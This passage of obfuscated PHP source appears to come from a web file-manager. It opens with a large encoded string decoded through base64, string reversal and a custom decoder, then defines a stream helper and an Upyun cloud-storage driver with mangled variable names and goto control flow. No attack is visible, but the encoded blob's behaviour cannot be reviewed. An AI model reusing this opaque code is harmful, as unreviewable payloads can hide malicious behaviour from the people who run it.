201\131\241\155\254\222\304\327\273\232\252\160\152\225\142\25\223\314\25\171\225\37\130\26".base64_decode('ARDy4QIDilTjIkoaoYmXhGh29cIFfgNK+vzHY7LtxzaG+Wl4EmWTJ5LaJlytKcoCTaHD1Q==')."\x54\x4d\xce\xa1\xaa\x95\xc\x92\x70\xb8\xf1\xf5\x42\x77\xe1\x2e\x76\x62\xbc\xc0\xaf\xc9\x99\x78\x1\x45\x4d\xb6\xd7\xe6\x7a\x8e\x61\xee\x40\xb4\xe2\x51\x62\x40\x7a\x9f\x80\xbc\x4b\xd4\xa2\xe5\x97\x95\x17\xc1"."\x95\xfb\x92\x72\x56\x2f\xbd\x98\xd7\x2f\x4f\x1f\xb9\x54\x57\x5e\xda\x4f\x14\x6f\x7e\xa1\xe0\x51\xe9\xfb\x9a\x95\xf\x62\xf9\xb9\x65\x5\xc4\xc0\xc6\x42\x8\xaf\x99\x95\x86\x96\x1c\xc4\x98\x25\xd8\x0\x34\x3"."\x32\xba\xb1\xba\x86\x66\x38\x5e\x64\xb1\x25\xab\xaf\x12\xbe\x73\x4a\x4e\xc1\x8a\xe2\xc1\xb5\x75\xeb\x68\x45\x58\xc8\xda\xb0\xa1\x3c\xd\x6c\xcc\xdd\x59\x81\x82\xe1\x4e\xc2\x18\xe4\x4e\xc3\x6a\x33\x91\x86\xf8"."\231\363\63\24\173\145\40\221\302\140\350\257\50\23\356\152\27\21\252\350\160\144\366\62\13\60\22\353\353\255\366\115\337\260\301\157\60\153\113\146\323\305\312\372\70\64\215\367\371\234\360\250".base64_decode('JzD0HBAS3JBUZD8JFuF+/uniniy3qlSwqWVT08JeLkL1szyVaJnkuWOSuFF/IkMKtFWOLw==')."\347\301\226\56\261\327\340\353\202\122\32\37\321\173\6\234\316\316\27\211\247\350\350\70\313\341\100\241\40\107\375\54\202\217\4\263\106\302\317\351\0\75\46\364\45\305\205\123\6\102\250\220".strrev('ò*¦ËÚ•H(ÖF¶]<Š¸}(;`£E’°,"xº£§‹täY¤ÈŒ<’8õğ2ºI+')."\x92\x47\x15\xa2\x58\x34\x87\x91\x2d\xde\x94\x5\x98\x66\x21\x9\x37\xdb\x54\x45\x9a\x6b\x65\x74\x1d\x95\x27\x54\xa9\xd2\x47\x50\xc1\x2a\x85\xd1\xcd\x9c\xc6\x47\xac\x68\x9b\x88\x25\xf2\x4b\x8c\xf0\x16\x63\x4f"."\x14\xae\x66\x5\xba\xe0\x18\xf6\xf8\x93\xe9\xef\x9\xc7\x33\x9c\x21\x8f\x86\x66\x91\xe8\x4b\x2e\x9e\x10\xa\x45\xe4\xeb\x34\xd6\x4a\x53\x20\x78\x13\xb2\x3b\x1a\x89\x47\x5a\xd8\xab\x6f\x4e\xf5\x35\x4d\x9b\xc5"."\xf6\xa\x16\xbd\xa4\x2b\x76\x99\xec\xfa\x20\xb7\x9e\x62\x10\x5c\x48\xf0\x43\xa\xcc\x7b\xb1\x94\xcf\x73\x73\x56\x8c\x99\x9c\x93\x35\x55\xfe\xd3\x4b\xd4\x6f\x7a\xaa\x7f\x92\x7c\xa5\x57\x63\xe7\xc8\x40\x47\xe9"."\301\170\54\123\262\5\63\305\117\205\304\261\43\2\13\222\45\237\253\330\343\253\236\362\365\122\177\11\115\165\354\362\30\63\236\25\27\127\31\244\234\243\140\46\320\317\107\35\255\164\77\20".base64_decode('SrGGqvHRJzxvVe2prvFNr60uz6Fmys58bO2nnhRDmfCYFDBzckmzJRwKdsXVEPDx+oa5vg==').base64_decode('OnFz0rCEm2QabuFmVkWdjKrP0a0KQ0OPoOLcyFbPOzTRdEizJvOu21BXV+etq0d/2a0R5g==')."\xd3\xb3\x91\xfb\x3e\x12\x20\x75\x75\x8d\xe4\x2f\xcd\x20\xc7\x40\x80\x82\xce\x1c\x44\xfc\x18\xd5\x6\x80\x11\x5d\x87\x6\x1\x97\x44\x1b\xde\x12\x13\x2b\x7b\x5b\xf0\xbd\x5a\x5\x37\xd\xa6\x45\x18\x9\x23\xec".base64_decode('I05vGQF1PJypEDsIiOnuQeAGJoDP7ISEOixnTBE1ZIAMCrSXX+JGYGLVzKf355t4o4L5VA==').strrev('É)Iò£ŒòUQc;ÒA8Ÿ¼’a’'."\n".'qtŞœeCMP(ÖQ'."\n".'>~W†Y{÷\\(š\\1ü¯').base64_decode('5jehSSzLvbPgaBevib7SRG8kwxhWWIUZc0QVUgiOnsRjZEjxppGhYUq6rY7HlXEfCZzr6g==')."\205\25\24\30\165\21\217\44\203\106\326\341\267\101\225\212\312\143\73\37\3\262\236\304\235\45\161\105\210\176\5\370\133\125\324\36\233\265\115\1\212\102\243\304\221\77\171\232\227\32\342\67"."\356\127\66\271\266\173\142\311\34\71\16\165\334\126\220\54\46\315\24\73\357\213\175\213\241\42\113\11\262\4\172\122\331\302\135\351\112\25\270\263\134\145\2\364\230\260\254\0\244\227\103\223"."\xd3\xd4\xa\xd0\x38\xdd\x5\x4d\x9c\xe6\xb6\x70\xdf\xe0\xb2\x27\x5d\xaa\x41\x92\xc\xe9\x2c\x78\xc2\x44\x58\x31\xb1\x3a\x86\xa5\xfd\xa4\xaf\x50\x34\x7\xd0\xac\x5b\xf2\xa0\xa1\xf4\xee\xca\xc9\x1c\xbc\x1c\xb2".base64_decode('AhBvvQwnJ+JzW/aGNqCzcP6gpThzlEDFVT8p0bmapYwW/qScnIj3p7LdGtk/OOvAG19nCg==').base64_decode('b9k3IB1TWNjw3rpslk3BBEXCyiT52Ex1oAnDVWYmh0dI2KU402kaVSk4DsPjhNBldfb8Ow==')."\x90\x42\xb2\xa8\x70\x5\x61\xf6\x8c\x71\xcc\xe1\x78\x1e\xd0\xb4\x91\xc9\x22\x72\x31\x67\xde\xdb\xe7\x5c\xcc\x2\x97\x32\x28\x3c\xac\x5c\xf9\x2c\x1f\x37\xe2\x21\x55\x65\x6d\xf\x5e\xd1\x1d\xfc\x49\xf1\xa\x88"."\xe8\x44\xb6\x32\xac\x22\x7c\x1b\x57\xd0\xc8\x49\xa1\x14\xc3\xb5\xb3\x93\x5e\xb4\x1f\xb6\xa8\xee\xd2\x83\x93\x15\xfa\xce\xb6\x92\xd7\xb9\xcb\xd\xe7\xa4\xca\x5\xe0\x61\x37\x13\x49\x8f\xd8\x2f\xb7\x5c\x8\xd7"."\xd5\xe3\x22\x51\x4b\x1c\x14\x91\xb7\x95\x8a\x6e\xcc\x54\x57\x99\xea\x6b\x0\x33\xe2\xa9\xec\x55\x17\x4a\x8f\x85\xd1\x89\x1f\xba\xdd\x8b\xba\xd5\x8f\x36\x35\x82\x9b\xc0\x84\xf4\x52\x6a\xcc\xea\x24\x1a\x48\x3e"."\217\270\3\20\112\261\331\122\234\274\126\342\34\212\134\55\342\301\361\14\126\333\364\53\244\321\363\311\233\40\25\162\261\263\23\366\65\356\261\34\370\0\202\61\155\276\55\306\325\7\122\22"."\63\15\313\322\156\234\26\361\56\24\115\165\230\125\110\257\45\160\120\324\14\326\170\215\265\215\30\320\222\67\45\244\235\272\53\352\66\67\306\45\44\371\6\105\45\76\114\244\0\233\61\162"."\xf6\xe4\x84\x30\xd3\x25\x41\x41\x8e\xdf\xbe\xea\x1c\x16\x38\x5b\x60\x55\x4c\xb2\xee\xac\xd0\x3e\xa8\x95\xd7\x89\x5b\x90\x17\x56\xc2\x20\xce\x14\xf5\xa4\x59\x4c\x61\xf6\x28\xf9\x10\xca\xdb\x51\x7d\x40\x8e\x12".base64_decode('yw22NoQ/e7kK7KdNIkIYYQJJuyR7fZOevEAx6QUTSSz11itcnlVpzTQyQ8og8JVEW5cWVg==').base64_decode('urtHNFKxUoIfrbsETnYdUJHlOXa/D1dA/HHhHlhyHqoWu5oXPZOLkG+WFaF5WKQSFwHlHA==')."\xb\x3f\x4d\xd2\xc3\x66\xb1\x52\x4e\x85\x4f\x91\x2c\x69\x44\x93\xdc\xb1\x1f\x8c\x8e\x18\x24\xc8\x18\xd3\x99\x7d\xbb\xb7\xbe\xc1\x3b\x13\xf6\x33\xf2\xe5\x40\xb6\x55\x3\xae\x82\x16\x96\x84\x6\x78\xb3\xcb\x88".base64_decode('GliHA5yAMSUDBeLpSvj0IU69+HwS7188VpQkC/E8PXGDJRN5YbVFDcoxQE+lfDpCOLvVcQ==')."\5\300\5\200\326\207\63\37\136\57\21\215\241\236\270\114\207\145\246\253\22\170\11\107\176\237\205\224\22\375\20\367\40\120\222\111\337\110\221\6\106\130\237\121\7\141\354\102\7\47\162\42"."\71\156\362\304\162\13\66\214\225\120\45\365\260\0\373\337\232\132\354\141\301\241\145\354\34\343\167\335\261\165\50\146\331\334\360\337\222\43\54\227\43\247\345\210\120\153\130\107\151\236\304\241".base64_decode('RnTmEIHt27s7uv08qZkvT6o2EX4JW5jJqT6qw3ZvJGcklXCkPdQSCLeGYkuUAXyayuUW8g==')."\x92\x91\x73\x29\x13\xed\x30\x1d\x78\x86\xd5\x9\xfe\xdc\xe\xe\x7a\x13\x68\xff\xe0\x4d\xf1\x3d\x96\x25\x76\x53\xa4\x2f\x50\x99\x78\x90\xd0\x59\x2d\xc5\x3f\xbd\x58\x56\x63\x1e\xdf\x50\xcc\x96\x95\xc1\x3a\xef"."\12\320\131\241\341\225\200\13\105\275\34\176\114\307\106\240\122\213\245\2\245\12\255\1\370\312\137\40\117\41\311\320\110\54\322\363\223\65\336\310\17\33\226\41\26\76\53\61\46\327\36\150"."\355\14\165\251\201\160\70\262\334\141\73\55\264\375\105\256\100\111\311\317\122\111\63\43\46\201\176\275\334\375\45\70\33\224\337\2\161\51\125\350\364\311\256\122\13\354\210\12\36\317\345\357".base64_decode('19Co9IhcoagZli4l0BfOpsOFQC2bdTwJm01L0ZKTs1b8lEo/wNIkt6yVAKKh9o74/7ipRg==').base64_decode('SnhINFLM2o5f+6ZP27TIzwezb4oHlMpT/qeP8HmE3KgST3LstU+TbJdAlqdpoYhKnaqJTw==').base64_decode('IHmlOFaQz1n9KT8fdBrAvmCD7HAPR8TGBYNDbfhzdDuLdulYo8i2OEw7hygHjLzD1NT1nA==').base64_decode('oPsugeOxwLJvkGdsaB45hEKQ/aJzKMafrRJF3TkVGoCyFaHz4gBKk1JHX7bkTxIpC5iXCw==')."\xf1\x1\xe2\xc0\x31\x98\x2b\xd8\x8e\xad\x7e\x87\x7c\xa1\x48\x9a\x1b\x9a\x80\x15\x40\x45\xae\xc1\xa3\x93\xcf\xa2\x78\x86\x9b\xd8\xac\xaa\x32\xbb\x24\x12\x93\xd8\x0\x62\x2b\x54\x33\x37\x56\x96\xe0\x50\x8f\x85"."\131\157\270\135\70\176\306\51\237\66\345\121\47\204\35\337\51\243\357\326\122\115\204\7\155\101\164\273\374\315\73\132\374\377\246\40\315\214\111\216\175\235\225\224\67\310\162\263\114\41\276\341"."\347\374\62\346\210\363\61\133\234\342\176\300\317\361\164\237\264\324\210\317\6\371\261\101\147\41\117\331\163\132\12\171\207\134\101\13\4\346\36\233\344\260\235\56\1\226\76\75\225\376\364\301"."\57\143\213\356\106\120\202\7\237\254\345\250\330\222\61\262\251\42\267\71\23\11\235\272\120\77\220\122\330\354\112\143\357\255\223\207\76\133\31\155\207\27\274\52\275\352\210\335\271\72\37\42"."\23\357\273\11\36\354\174\357\212\37\347\133\142\11\131\266\343\205\265\270\31\327\6\74\24\125\61\165\24\261\346\61\71\54\337\125\40\275\100\231\114\105\230\342\363\275\120\2\140\57\245\246"."\74\344\341\116\112\40\335\117\204\111\353\223\323\141\271\364\100\326\114\150\131\60\210\164\334\100\54\242\135\231\316\170\211\3\214\46\371\265\102\101\34\210\310\254\27\375\357\270\44\16\171\75"."\361\16\225\70\114\121\251\175\102\114\340\234\164\34\111\23\341\150\262\224\17\321\203\31\107\152\121\332\57\312\56\261\351\141\215\270\153\14\340\250\235\335\364\34\26\6\114\256\222\235\215\163"."\105\73\242\107\174\133\355\57\77\113\307\106\144\100\121\260\321\216\56\154\111\210\367\22\171\103\7\0\312\2\105\240\206\143\41\143\124\102\122\65\175\32\225\120\12\231\242\175\103\252\364\174".strrev('zoòµÄz¼Ï¤ëNğ­tKeu^Êô¿–£¯ÜkL$úvA!ÍóOU§äùŠ:5éZÁ<')."\344\116\134\176\56\240\251\160\276\340\313\105\14\276\377\50\333\302\270\167\57\174\130\135\5\242\356\101\216\233\345\132\147\141\155\340\170\204\126\352\65\220\266\362\207\154\245\141\220\372\135\52".base64_decode('Zj3E8MLD7BkrvoXreHLPPaEVXtP91grhEgjZvKWcVK9xQaLIzq3dYIYDdxEDFhcjqSfsMg==')."\x6\xb1\x32\x97\x6a\x98\x39\x7b\x9e\xac\x24\x11\x53\x28\x4e\x73\xc1\x49\xc\x1c\x4a\x83\x8c\x23\x90\x42\x71\xa2\xa1\xc2\xdc\x6f\xcb\xab\x9f\x64\x3a\x6f\x15\x95\x3f\xc3\xec\xe2\x0\xff\xb3\x5\x23\x76\x21\x14"."\x54\xb2\xb9\x2d\x7f\xb0\xbe\x6c\x4\x8\x9e\x4a\x96\x5f\x12\x43\x74\x99\xf8\x98\xd8\xea\xc6\x12\xab\x8e\xb2\x40\xf1\xdc\xb2\xf3\x5b\x54\x7c\xa8\xd0\xf\x89\xef\x89\xc5\x42\x9f\xce\x35\xb3\x78\xaf\x9e\xc3\x27"._kodDe('LmbyY0E8Xt0buK+gOA692kaIevjDpPoSIspLuZDKJUuWdJVTeziuk8RsgcgG5iYRqYtGeTQ=')."\xfe\x7\x13\xc8\xf6\x5a\x74\x5b\x26\xac\xbf\x70\xf7\x1d\x5b\x74\xe7\x28\xf8\x17\x33\x32\x53\xe1\x99\x64\xc9\x36\xe6\x1b\xfa\x40\x25\x3d\xbe\xc7\xf4\x6a\xb6\x57\x42\x4e\x49\x25\xa9\xdb\x11\x32\xd9\x40\x2e\xc4"."\x56\xd8\xd9\x6f\x57\xf5\xa8\x98\xa8\xa3\xdf\xa3\x4c\x6\x54\x2e\xee\x49\xaf\x29\xb\x3f\x8f\x92\xa0\x87\x4b\xb3\x9b\xf6\x93\x68\x12\xc8\x45\x6f\xa7\xc8\x24\xbf\x2\x4b\x2e\x4b\xb\x87\x44\x64\xe9\x3a\x96\xb1"."\xe4\xed\x5e\xbe\x6c\x4c\x2a\x92\xd7\x47\x79\xd5\xd2\x9b\xba\x42\xd3\x44\x54\x53\xd0\x23\x58\xdc\xc4\x84\x82\x34\x33\xd0\xce\xef\xa8\x6b\x92\x29\x9f\x53\xfd\x5\xc2\x9d\xf4\xa\x3c\x1a\x3e\xe9\x69\x74\x53\xe".base64_decode('iznBPCHCboSg5jj2sygu3LxL9CvlSmRjRoiGoIeS7wPHVok/M+rYOlnut4aRKCg/DICi7g==')."\x57\xd8\x81\x70\x92\x1b\x84\xf4\x6b\x12\xeb\x15\x5c\x56\x84\xba\x4a\x39\x11\x91\x94\xc8\x64\xbf\xc5\x33\x1d\x2e\x22\xb0\x37\x43\x17\x8d\x60\x8e\x27\x2c\xd7\x4b\xe3\xd4\x4d\x3b\xd\xb3\x6d\xc1\xff\xfa\x99\xdd"."\377\127\257\353\316\256\143\352\176\134\77\277\16\330\16\302\71\264\26\237\260\162\245\7\125\65\273\372\341\144\257\123\0\213\320\340\373\206\5\121\41\161\156\20\316\74\132\62\107\227\32\73"."\200\323\262\131\211\11\127\336\316\224\75\161\216\220\157\220\277\227\135\51\342\276\47\355\176\356\274\227\150\172\331\113\346\375\225\0\5\135\342\273\246\12\170\114\223\230\260\54\150\122\336\110"."\16\126\70\75\47\6\261\316\147\25\44\341\244\14\114\264\1\311\60\314\125\250\237\205\222\170\273\110\334\351\300\350\311\236\17\42\5\266\261\254\5\56\320\277\230\121\53\342\146\5\210\226"."\114\250\34\111\145\344\55\356\230\23\107\242\74\334\202\6\371\330\164\72\112\164\272\236\165\246\100\226\74\266\216\43\2\42\357\24\112\356\167\7\350\326\110\56\45\333\133\224\177\200\223\12".base64_decode('uQg21Xeq0TAO4LZ767yuhHqvqzr++LVzOTheY6Y2KmgNRbGWhGnLyEEUOZ/2lpehqB8TMA==').base64_decode('kyy+yiSAN0qoDnFIHg9GSrqLJhlbZyrXHEnW00lJP+sWD2nyVF8ZY2NU1TGZ2KhPHIDGIw==')."\321\240\272\74\204\35\171\204\126\5\173\230\177\151\303\44\57\273\260\52\173\72\153\310\165\75\130\43\150\243\323\146\12\154\323\21\275\223\224\305\302\21\62\266\41\47\32\121\131\246\140\227"."\304\245\133\21\314\21\231\254\267\164\2\343\253\55\316\5\273\260\22\130\322\54\132\262\37\121\107\46\226\315\114\224\33\145\233\355\236\74\132\355\172\322\326\123\12\346\362\16\301\277\167\126".strrev('o!U’^gmAC÷ ÁâFÛ1„<¥PáÔ™Ë0f'."\0".'³/LØ;	ßYÈsåªoşÌİ')."\x2a\xc1\x8b\x51\x93\xcc\x4d\x97\xd9\x22\xe4\xf\x57\x1e\xa6\x1f\x93\xe7\xe2\x2d\x2c\x3f\x95\x66\xef\xc8\x60\xeb\x3a\x3f\xf6\x7a\x86\x2f\x6b\xf8\x9\x6\x32\xc7\x1e\x6a\x4e\x65\xc6\x46\x58\x71\x20\xd4\x3f\x84"."\x2c\x97\x6f\x1c\xe1\x4b\x76\x71\x2c\x52\x8c\xe6\xf8\x1d\xd\xa2\xf2\xa1\x5a\x1c\x87\x32\x7\xac\x8\xe4\x24\xe9\x54\x1d\xed\xc8\x52\xce\x97\xd5\x48\x26\x49\x66\xee\xca\xa1\x6\xe9\x5c\xd8\x79\x2c\xcf\xaf\xf2"."\226\61\311\222\21\226\262\111\51\346\366\26\375\142\37\6\41\341\163\212\144\323\23\257\300\260\306\335\272\271\113\365\70\166\273\322\41\176\222\320\210\140\371\71\255\70\76\226\104\114\126\14"."\157\227\5\367\167\245\113\64\125\60\106\155\130\10\314\142\303\226\112\265\151\303\25\100\123\154\313\312\123\121\12\7\45\2\267\344\204\104\134\234\321\107\344\257\3\234\270\327\342\0\54\117"."\x15\x4e\x4a\xa4\xf2\xe2\xc4\x4e\x74\x13\xa7\x55\xea\x3e\xa1\x71\xce\xe2\xb2\x13\x14\x8e\x54\x22\x89\x3e\x95\xc5\x2d\x5e\xa4\xcd\x31\x36\x9\x12\xa6\x30\xb4\x2b\x5c\x7\x24\x3e\xe9\x74\xb9\xc2\xc1\xf8\x9c\x21"."\30\162\253\316\353\110\165\155\367\261\272\215\11\213\256\54\120\100\111\325\127\324\123\111\50\240\147\303\122\165\362\271\375\244\5\142\225\77\42\260\322\71\304\222\257\32\221\301\344\32\323\61"."\370\22\327\342\35\3\310\250\234\351\150\216\173\152\311\356\124\240\57\115\314\21\135\77\315\13\70\263\50\274\356\152\275\134\300\335\63\132\102\146\45\216\364\21\303\116\146\244\255\164\171\146".base64_decode('eXqxbLChAZX74W4tG2u3gkFUUtYeySgoblYoQ1tUsRjNwiXFDsZRdpIhwGVpFi5bls0Klw==').base64_decode('jSspZ2sla5LulQ8eKKxSFTos1DoS6GTjWRG4/HOAiW5oouGq3AqhmHIZZ1RqRUXgSVvhhg==').base64_decode('FjIH3qZWynHYMjk5SiW6zXIqUGpKhSY1chKGP+UsQ+RVMEOin8TSj+z/skK2bNNU2eopWg==').strrev('õ›V\\ãİ'."\n".'rX½¶”öro0~R’°uL~îÉîaAe‚$`@hdià@<ºW$sNXÊ‘')."\363\45\311\347\175\305\253\50\36\254\75\52\327\323\144\65\176\373\117\130\304\321\215\265\151\33\111\335\351\130\137\166\203\111\363\331\107\262\222\256\332\245\46\26\272\54\207\271\114\5\345\51"."\111\2\211\131\234\330\320\372\44\341\110\340\204\343\246\30\25\111\340\240\213\236\221\267\140\13\16\176\72\112\274\273\123\26\116\263\143\146\321\366\340\274\270\131\40\277\315\246\155\13\333\23"."\xaa\x3c\x22\x62\x36\xe6\xc3\x1e\xc9\xb4\xa\x85\xc4\x51\x28\x6e\x14\x39\x63\x23\x68\x4b\x28\x16\x9\xc2\x69\x3d\xd6\xca\xc4\x74\x9a\x4b\xe8\x9c\x23\x82\xcf\xee\x78\x44\x66\xb3\x70\x6a\xdf\x56\x72\xd9\x15\x88"."\x84\x41\x33\x95\x30\x47\x99\xef\x49\xec\xff\x43\xb4\x47\x9c\xee\x69\x6e\xd9\x52\x88\x45\x80\x8a\xb2\xa1\x18\xf1\xb2\x62\xf9\x69\x8e\x1f\x5e\x78\xf2\x92\x3a\xe0\xd5\x58\xdf\x9a\xc2\x80\xa3\x38\x7d\x6f\x93\x9b"."\167\177\123\15\240\341\27\125\320\47\134\210\272\25\156\262\305\342\261\262\254\356\100\54\266\74\22\155\245\57\276\224\145\223\122\222\341\135\131\126\167\107\244\153\262\274\140\147\40\24\56\313".base64_decode('wzZ6XarwYkqzQt2kleSAerJWhFqWiJYQUwhxcFTImOw8iB2sxbQs0wRJBwt6TrivFWWcCg==')."\x2e\x79\x5e\x2d\xe6\x67\x9a\x7\x9c\x4f\x2b\xba\x4c\x61\x19\xc2\x42\x45\xd8\xbe\xae\xb\xea\x8e\x16\x20\x15\xbf\x80\xc3\xd7\x3d\x97\xdf\x85\x6d\x87\xcf\x61\x3\x22\xa5\x93\xb5\x41\x88\x8d\x84\x73\x32\x1f\x27"."\11\323\53\16\220\174\320\120\176\10\106\162\305\0\340\206\235\144\202\161\346\32\63\41\35\162\321\335\23\334\45\207\41\225\154\50\151\330\221\155\153\3\25\115\41\250\376\30\257\176\241\331".base64_decode('/T+5+MUxkrcAAA==').""."".base64_decode('').""."", 10, -8))); goto dÒì±•Ö; cï…ù””Š­: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($û±·¨¤, $Ïá¼œóø = 0) { parent::__construct(); $this->source = $û±·¨¤; $this->sourceSize = $Ïá¼œóø; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($©³øñ© = false) { return $this->sourceSize; } public function getContent($³Ã›¸¬ = false) { return $this->fileSubstr($³Ã›¸¬, 0, $this->sourceSize); } public function fileSubstr($¶İåÕ§à = false, $ƒ‡’Äí = 0, $™š³ú±´ = 0) { if (!$™š³ú±´) { $™š³ú±´ = $this->sourceSize; } $ƒÄ“ñœ‡ = $this->sourceSize - $ƒ‡’Äí; if ($™š³ú±´ >= $ƒÄ“ñœ‡) { $™š³ú±´ = $ƒÄ“ñœ‡; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ƒ‡’Äí, $™š³ú±´); } if ($this->sourceType == self::TYPE_FILE) { if ($™š³ú±´ <= 0) { return $_SERVER[³à¼î¯á][12]; } $‘Ô„òì = ftell($this->source); fseek_64($this->source, $‘Ô„òì + $ƒ‡’Äí); $¦Ü¨¼” = @fread($this->source, $™š³ú±´); fseek_64($this->source, $‘Ô„òì); return $¦Ü¨¼”; } } public function hashMd5($‹¤«¶ = false) { return md5($this->getContent()); } public static function hash($†Çãƒµñ, $§Æ–¢‘§ = 0) { $Â×–¡ª¯ = new PathDriverStream($†Çãƒµñ, $§Æ–¢‘§); return $Â×–¡ª¯->hashSimple($†Çãƒµñ); } public static function md5($Ù¡Ç©À¿, $¦ºÊá¢ğ = 0) { $ªÃ™½à¯ = new PathDriverStream($Ù¡Ç©À¿, $¦ºÊá¢ğ); return $ªÃ™½à¯->hashMd5($Ù¡Ç©À¿); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\x3a\x2f\x2f\x76\x30\x2e\141\160\x69\56\x75\160\171\x75\x6e\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¯âÔı´ï) { parent::__construct(); $this->_init($¯âÔı´ï); } public function _init($®˜ı¼ß) { $íÔè¹© =& $_SERVER[³à¼î¯á]; foreach ($®˜ı¼ß as $‰ î°·Š => $Ğ»«€´¼) { if (isset($this->{$‰ î°·Š})) { $this->{$‰ î°·Š} = $Ğ»«€´¼; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($íÔè¹©[1529] . LNG($íÔè¹©[1433])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Òò½ş¨, $º™¹µ³Ñ = "\107\105\124") { $´ğüÀ²Ü =& $_SERVER[³à¼î¯á]; $³Ì…ÃÜÄ = gmdate($´ğüÀ²Ü[1466]); $ÎÆâÉÉ = base64_encode(hash_hmac($´ğüÀ²Ü[1530], "{$º™¹µ³Ñ}\x26{$Òò½ş¨}\x26{$³Ì…ÃÜÄ}", md5("{$this->userpass}"), !0)); $ß¬«éğ = array("\101\165\x74\x68\157\162\x69\172\x61\164\x69\x6f\x6e\72\x55\120\x59\125\x4e\x20{$this->username}\x3a{$ÎÆâÉÉ}", "\x44\141\164\145\72{$³Ì…ÃÜÄ}"); return $ß¬«éğ; } public function ussRequest($áˆ‚‹¬—, $ÓüÓ¼·Ú = "\107\105\124", $…ÒÑïÖ = false, $¿¾¯ò‰ = false, $ÛÇŒ¶“À = false) { $”çÇ×Û =& $_SERVER[³à¼î¯á]; $áˆ‚‹¬— = trim($áˆ‚‹¬—, $”çÇ×Û[8]); $®Ü¥øİ = "\57{$this->bucket}\57{$áˆ‚‹¬—}"; $”—íÎİç = $this->ussHeaders($®Ü¥øİ, $ÓüÓ¼·Ú); if ($¿¾¯ò‰) { $”—íÎİç = array_merge($”—íÎİç, $¿¾¯ò‰); } $°Ìç‰ = url_request($this->endpoint . $®Ü¥øİ, $ÓüÓ¼·Ú, $…ÒÑïÖ, $”—íÎİç, $ÛÇŒ¶“À); if (!$°Ìç‰) { $Àõ¾¬¼ = LNG($”çÇ×Û[1531]); $this->writeLog($Àõ¾¬¼); return array($”çÇ×Û[1266] => !1, $”çÇ×Û[1256] => $Àõ¾¬¼); } if (strtolower($ÓüÓ¼·Ú) == $”çÇ×Û[218] || in_array($°Ìç‰[$”çÇ×Û[1266]], array($”çÇ×Û[265], $”çÇ×Û[1532]))) { $…ÒÑïÖ = $°Ìç‰[$”çÇ×Û[1533]]; } else { $…ÒÑïÖ = json_decode($°Ìç‰[$”çÇ×Û[1256]], !0); if (!$…ÒÑïÖ) { $…ÒÑïÖ = $°Ìç‰[$”çÇ×Û[1256]]; } else { if (!$°Ìç‰[$”çÇ×Û[795]] && isset($…ÒÑïÖ[$”çÇ×Û[1534]])) { $…ÒÑïÖ = $…ÒÑïÖ[$”çÇ×Û[1534]]; } } } if (!$°Ìç‰[$”çÇ×Û[795]]) { $this->writeLog($this->__errorMessage($…ÒÑïÖ)); } return array($”çÇ×Û[1266] => $°Ìç‰[$”çÇ×Û[795]], $”çÇ×Û[1256] => $…ÒÑïÖ); } private function __errorMessage($ ø°“É«) { $ïò»ßöÇ =& $_SERVER[³à¼î¯á]; if (!$ ø°“É«) { return $ïò»ßöÇ[12]; } static $ƒã¥Ë³ô = null; if (!$ƒã¥Ë³ô) { $ƒã¥Ë³ô = I18n::getType(); } if ($ƒã¥Ë³ô != $ïò»ßöÇ[1476]) { return $ ø°“É«; } $³ãÃËşÅ = array($ïò»ßöÇ[1535] => $ïò»ßöÇ[1536], $ïò»ßöÇ[1537] => $ïò»ßöÇ[1538], $ïò»ßöÇ[1539] => $ïò»ßöÇ[1538], $ïò»ßöÇ[1540] => $ïò»ßöÇ[1541], $ïò»ßöÇ[1542] => $ïò»ßöÇ[1543], $ïò»ßöÇ[1544] => $ïò»ßöÇ[1545], $ïò»ßöÇ[1546] => $ïò»ßöÇ[1547]); return isset($³ãÃËşÅ[$ ø°“É«]) ? $³ãÃËşÅ[$ ø°“É«] : $ ø°“É«; } public function mkfile($Î¢®’Ã‰, $¹¨ëãÇ€ = '', $Ì·Ç¸“í = REPEAT_RENAME) { if ($this->setContent($Î¢®’Ã‰, $¹¨ëãÇ€)) { return $this->getPathOuter($Î¢®’Ã‰); } return !1; } public function mkdir($„‰´Ú, $›¢şŞ…Š = REPEAT_SKIP) { $†‘†Ÿ ¸ =& $_SERVER[³à¼î¯á]; $…ş‹§íÉ = trim($„‰´Ú, $†‘†Ÿ ¸[8]); if ($this->_isFolder($…ş‹§íÉ)) { return $this->getPathOuter($…ş‹§íÉ); } $ë›ŸÈº‹ = array($†‘†Ÿ ¸[1548]); $…µÀ“ûù = $this->ussRequest($…ş‹§íÉ, $†‘†Ÿ ¸[248], !1, $ë›ŸÈº‹); return $…µÀ“ûù[$†‘†Ÿ ¸[1266]] ? $this->getPathOuter($…ş‹§íÉ) : !1; } public function copyFile($ªé¬çÆ, $³‰â¸®£) { $„‘éÃ‹Š =& $_SERVER[³à¼î¯á]; $İîÚŠ‘³ = array($„‘éÃ‹Š[1549] . "\57{$this->bucket}\57{$ªé¬çÆ}", $„‘éÃ‹Š[1550]); $™ÄŸ¥î = $this->ussRequest($³‰â¸®£, $„‘éÃ‹Š[250], !1, $İîÚŠ‘³); return $™ÄŸ¥î[$„‘éÃ‹Š[1266]] ? !0 : $this->getPathOuter($³‰â¸®£); } public function moveFile($®Õùã¿, $ˆ²Šàè³) { $Ğ„ş»™¹ =& $_SERVER[³à¼î¯á]; $§ô¼°Õæ = array($Ğ„ş»™¹[1551] . "\57{$this->bucket}\x2f{$®Õùã¿}", $Ğ„ş»™¹[1550]); $äêö·¬ = $this->ussRequest($ˆ²Šàè³, $Ğ„ş»™¹[250], !1, $§ô¼°Õæ); return $äêö·¬[$Ğ„ş»™¹[1266]] ? !0 : $this->getPathOuter($ˆ²Šàè³); } public function delFile($§´ŠïõÈ) { $‹‡¨¥½è =& $_SERVER[³à¼î¯á]; $È¿Â‹Ïä = $this->ussRequest($§´ŠïõÈ, $‹‡¨¥½è[1552]); return 